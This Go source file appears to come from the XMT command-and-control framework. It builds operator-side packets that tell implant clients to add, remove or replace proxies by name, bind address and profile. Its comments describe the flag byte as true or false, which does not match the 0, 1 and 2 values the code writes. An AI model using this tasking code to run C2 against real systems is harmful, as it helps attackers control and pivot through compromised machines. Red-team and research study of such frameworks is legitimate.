//go:build !implant
// +build !implant

// Copyright (C) 2020 - 2023 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

package task

import "github.com/iDigitalFlame/xmt/com"

// ProxyRemove returns a remove Proxy Packet. This can be used to instruct the
// client to attempt to remove the Proxy setup by the name, or the single Proxy
// instance (if multi-proxy mode is disabled).
//
// Returns an NotFound error if the Proxy is not registered or Proxy support is
// disabled
//
// C2 Details:
//
//	ID: MvProxy
//
//	Input:
//	    string // Proxy Name (may be empty)
//	    uint8  // Always set to true for this task.
//	Output:
//	    <none>
func ProxyRemove(name string) *com.Packet {
	n := &com.Packet{ID: MvProxy}
	n.WriteString(name)
	n.WriteUint8(0)
	return n
}

// Proxy returns an add Proxy Packet. This can be used to instruct the client to
// attempt to add the specified Proxy with the name, bind address and Profile
// bytes.
//
// Returns an error if Proxy support is disabled, a listen/setup error occurs or
// the name already is in use.
//
// C2 Details:
//
//	ID: MvProxy
//
//	Input:
//	    string // Proxy Name (may be empty)
//	    uint8  // Always set to false for this task.
//	    string // Proxy Bind Address
//	    []byte // Proxy Profile
//	Output:
//	    <none>
func Proxy(name, addr string, p []byte) *com.Packet {
	n := &com.Packet{ID: MvProxy}
	n.WriteString(name)
	n.WriteUint8(2)
	n.WriteString(addr)
	n.WriteBytes(p)
	return n
}

// ProxyReplace returns a replace Proxy Packet. This can be used to instruct
// the client to attempt to call the 'Replace' function on the specified Proxy
// with the name, bind address and Profile bytes as the arguments.
//
// Returns an error if Proxy support is disabled, a listen/setup error occurs or
// the name already is in use.
//
// C2 Details:
//
//	ID: MvProxy
//
//	Input:
//	    string // Proxy Name (may be empty)
//	    uint8  // Always set to false for this task.
//	    string // Proxy Bind Address
//	    []byte // Proxy Profile
//	Output:
//	    <none>
func ProxyReplace(name, addr string, p []byte) *com.Packet {
	n := &com.Packet{ID: MvProxy}
	n.WriteString(name)
	n.WriteUint8(1)
	n.WriteString(addr)
	n.WriteBytes(p)
	return n
}
